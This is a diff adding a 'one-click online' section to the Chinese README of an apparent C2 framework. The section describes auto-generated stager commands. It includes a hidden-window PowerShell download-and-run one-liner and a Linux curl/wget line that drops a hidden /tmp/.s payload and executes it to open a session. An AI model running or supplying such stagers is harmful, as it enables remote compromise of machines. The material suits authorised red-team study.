@@ -337,6 +337,27 @@ ssh -L 8080:127.0.0.1:8080 user@host
 - **darwin / freebsd 载荷**：没有对应主机，仅验证了能构建。
 
 `build/shellcode_loader/` 提供两个用来做上述验证的小工具（含使用注意）。
+### 一键上线
+
+监听器页有「一键上线」面板：**选一个监听器，直接拿到一条能建立会话的命令。**
+
+Windows 与 Linux 各一套模板，另有 certutil / BITS / Python 等备选，**同一个下载
+地址**，可随时换一种复制。
+
+**关键设计**：C2 地址、下载地址、端口**全部从你已建的监听器推导**，不让你填。
+这三者手工保持一致正是出问题的地方 —— 命令抓一个没人服务的路径、或载荷回连到
+没人监听的地址，都会「构建成功、下载成功、然后永远不上线」，而控制台不会有任何
+提示。
+
+实测（真实会话）：
+
+    Windows: powershell -nop -w hidden -c "...DownloadFile(...);Start-Process $o"
+             → ✅ 会话上线
+    Linux:   (curl -fsSL URL -o /tmp/.s || wget -qO /tmp/.s URL) && chmod +x /tmp/.s && /tmp/.s
+             → ✅ 会话上线
+
+只有 HTTP 家族的监听器能托管载荷（mTLS / DNS / WireGuard 无法用命令行抓取），
+所以面板只列出可用的那些。
 ### Windows 终端的实现与限制
 
 Windows 上的「终端」**不是 PTY**，而是把 `cmd.exe` / `powershell.exe` 当
